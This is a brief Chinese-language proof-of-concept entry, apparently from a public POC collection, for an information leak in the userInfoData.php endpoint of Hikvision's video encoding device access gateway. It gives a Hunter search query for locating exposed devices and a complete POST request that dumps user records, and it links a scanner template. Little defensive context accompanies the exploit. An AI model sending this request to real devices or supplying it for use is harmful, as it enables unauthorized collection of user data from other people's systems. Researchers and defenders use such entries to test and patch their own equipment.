# 海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞

# 一、漏洞简介
海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞。

# 二、影响版本
+ HIKVISION 视频编码设备接入网关

# 三、资产测绘
+ hunter：`web.title="视频编码设备接入网关"&&app.name=="Hikvision 海康威视视频编码设备接入网关"`


+ 登录页面


# 四、漏洞复现
```plain
POST /data/userInfoData.php HTTP/1.1
Host: 
Content-Length: 38
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin:
Referer:
Accept-Language: zh-CN,zh;q=0.9
Connection: close

page=1&rows=20&sort=userId&order=asc
```


[hikvision-spbmjrwg-userinfodate-info.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1711075901506-37d4c294-7138-466e-b8bb-17d265f17fe6.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zq2np1ubh0igzfoa>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
